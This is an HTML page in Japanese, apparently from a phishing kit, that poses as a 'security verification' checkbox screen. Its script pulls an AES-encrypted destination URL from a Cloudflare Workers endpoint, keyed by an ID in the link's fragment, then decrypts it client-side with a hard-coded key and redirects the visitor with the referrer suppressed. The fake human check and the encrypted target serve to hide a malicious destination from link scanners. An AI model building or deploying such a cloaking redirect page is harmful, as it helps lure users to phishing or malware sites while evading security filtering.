<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>セキュリティ確認</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="robots" content="noindex,nofollow" />
  <style>
    body{font-family:"Noto Sans JP",sans-serif;background:#f6f9fc;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center}
    .card{background:#fff;border:1px solid #e5e9ef;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.05);padding:28px;max-width:420px;width:92%;}
    h1{font-size:18px;margin:0 0 8px}
    p{color:#666;margin:4px 0}
    .loader{border:5px solid #f3f3f3;border-top:5px solid #3498db;border-radius:50%;width:42px;height:42px;animation:spin 1s linear infinite;margin:18px auto;display:none}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    label{display:flex;align-items:center;gap:8px;margin-top:12px}
    input[type=checkbox]{transform:scale(1.3)}
    button{margin-top:16px;padding:10px 18px;border:0;border-radius:6px;background:#6b7280;color:#fff;cursor:not-allowed}
    button.enabled{background:#2563eb;cursor:pointer}
    .msg{margin-top:12px;font-size:13px;color:#059669;display:none}
    .err{color:#dc2626}
    small{display:block;margin-top:16px;color:#9ca3af}
  </style>
</head>
<body>
  <div class="card">
    <p id="step">アクセスの安全性を確認しています。しばらくお待ちください。</p>
    <div class="loader" id="loader"></div>

    <div id="verify" style="display:none;">
      <label><input type="checkbox" id="chk" />人間であることを確認します</label>
      <button id="goBtn" disabled>続行</button>
      <div class="msg" id="ok">✅ 検証に成功しました。リダイレクト中...</div>
      <p class="err" id="err" style="display:none;"></p>
    </div>

    <small>セキュリティ認証サービス</small>
  </div>

  <script>
    // ===== 配置 =====
    const AES_KEY = "5Ctianyoumabiiii"; // 必须与 Worker 一致
    const WORKER_APIS = [
      "https://9roj-0ctzkb.geebabymusic.workers.dev/",   // ← 改为你的Workers域（可放多个做轮询）
      // "https://api-2.example.com",
    ];

    // ===== 工具 =====
    const b64uToBytes = (b64u) => {
      const b64 = b64u.replace(/-/g, '+').replace(/_/g, '/');
      const pad = b64.length % 4 === 2 ? '==' : (b64.length % 4 === 3 ? '=' : '');
      const bin = atob(b64 + pad);
      return Uint8Array.from(bin, c => c.charCodeAt(0));
    };
    async function decryptAES(encB64u) {
      const bytes = b64uToBytes(encB64u);
      const iv = bytes.slice(0,16);
      const data = bytes.slice(16);
      const key = await crypto.subtle.importKey(
        "raw",
        new TextEncoder().encode(AES_KEY),
        { name: "AES-CBC" },
        false,
        ["decrypt"]
      );
      const pt = await crypto.subtle.decrypt({ name:"AES-CBC", iv }, key, data);
      return new TextDecoder().decode(pt).replace(/\u0000+$/,'');
    }

    // ===== 主流程 =====
    (async () => {
      const loader = document.getElementById('loader');
      const step = document.getElementById('step');
      const verifyBox = document.getElementById('verify');
      const chk = document.getElementById('chk');
      const goBtn = document.getElementById('goBtn');
      const ok = document.getElementById('ok');
      const err = document.getElementById('err');

      loader.style.display = 'block';

      // 取 fragment 中的 明文ID（如 #MnyrelZH）
      const id = (location.hash || '').replace(/^#/, '').trim();
      if (!id) {
        loader.style.display = 'none';
        step.innerText = '無効なリンクです。';
        return;
      }

      // 轮询 Worker API
      let enc = null;
      let lastError = null;
      for (const base of WORKER_APIS) {
        try {
          const r = await fetch(`${base}/get_url?id=` + encodeURIComponent(id), { method: 'GET' });
          const j = await r.json();
          if (j && j.enc) { enc = j.enc; break; }
          lastError = j?.error || ('HTTP '+r.status);
        } catch(e) {
          lastError = e.message;
        }
      }

      if (!enc) {
        loader.style.display = 'none';
        step.innerText = 'ページを読み込めませんでした。しばらくしてからもう一度お試しください。';
        err.style.display = 'block';
        err.innerText = 'エラー: ' + (lastError || 'unknown');
        return;
      }

      loader.style.display = 'none';
      step.innerText = 'あなたが人間であることを知らせてください';
      verifyBox.style.display = 'block';

      chk.addEventListener('change', () => {
        if (chk.checked) {
          goBtn.disabled = false;
          goBtn.classList.add('enabled');
        } else {
          goBtn.disabled = true;
          goBtn.classList.remove('enabled');
        }
      });

      goBtn.addEventListener('click', async () => {
        goBtn.disabled = true;
        ok.style.display = 'block';
        try {
          const target = await decryptAES(enc);
          // 保护 Referer（尽量）：用 a.click()
          const a = document.createElement('a');
          a.href = target;
          a.rel = 'noreferrer noopener';
          document.body.appendChild(a);
          a.click();
        } catch(e) {
          ok.style.display = 'none';
          err.style.display = 'block';
          err.innerText = '復号エラー: ' + e.message;
        }
      });
    })();
  </script>
</body>
</html>
